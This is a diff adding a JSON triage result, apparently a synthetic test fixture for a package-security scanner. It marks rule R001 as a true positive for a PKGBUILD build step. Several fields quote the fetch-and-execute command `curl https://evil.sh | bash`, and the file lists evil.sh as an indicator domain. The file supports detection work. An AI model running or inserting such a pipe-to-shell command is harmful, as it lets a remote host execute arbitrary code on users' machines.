@@ -1,0 +1,41 @@
+{
+  "alert_slug": "synthetic/r001-tp",
+  "confidence": "high",
+  "overall": "TP",
+  "package": "malicious-pkg",
+  "rules": [
+    {
+      "agree": true,
+      "bad_practice_present": true,
+      "citation": "# curl https://evil.sh | bash (in the PKGBUILD)",
+      "cited": true,
+      "class": "true_positive",
+      "confidence": "high",
+      "ioc_entries": [
+        {
+          "confidence": "high",
+          "provenance": "the URL fetched and executed by `curl https://evil.sh | bash` in PKGBUILD build()",
+          "type": "domain",
+          "value": "evil.sh"
+        }
+      ],
+      "malicious_behaviour_present": true,
+      "malicious_citation": "curl https://evil.sh | bash (PKGBUILD)",
+      "malicious_citation_grounded": true,
+      "malicious_reasoning": "The build downloads an unverified remote script and pipes it directly to a shell with sha256sums set to SKIP; executing downloaded code without verification is actual malicious behaviour, not merely an unconventional pattern.",
+      "reasoning": "The added line pipes an unverified remote script directly into a shell during build, which is exactly the careless fetch-and-execute pattern the rule targets; it is not a benign idiom.",
+      "resolution": "This is a genuine fetch-and-execute finding: the PKGBUILD's build step runs an unescaped `curl https://evil.sh | bash` pipeline, which downloads and executes code from evil.sh during package build. The malicious evidence must be fixed in the source repo (the maintainer Alice's repository) by removing that line; this is remediation of the attack, not a rule change.",
+      "rule_id": "R001",
+      "samples": [
+        [
+          "True",
+          "True"
+        ]
+      ],
+      "tp_twin": "`curl URL | sh/bash` where evil.sh must be replaced with a legitimate/verified fetch-and-execute endpoint",
+      "where": "PKGBUILD (build() function, around line 12)"
+    }
+  ],
+  "score": 80,
+  "score_threshold": 20
+}
